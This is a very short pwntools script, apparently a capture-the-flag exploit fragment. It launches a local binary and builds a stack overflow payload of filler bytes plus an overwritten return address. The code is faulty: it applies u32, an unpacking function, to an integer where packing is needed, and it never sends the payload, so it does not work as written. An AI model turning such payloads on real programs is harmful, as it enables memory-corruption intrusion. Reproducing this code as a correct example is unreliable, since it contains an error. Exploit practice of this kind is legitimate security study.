from pwn import *

r = process("./a.out")

payload = b"a"*0x6c + b"b"*4 + u32(0x565561ad)
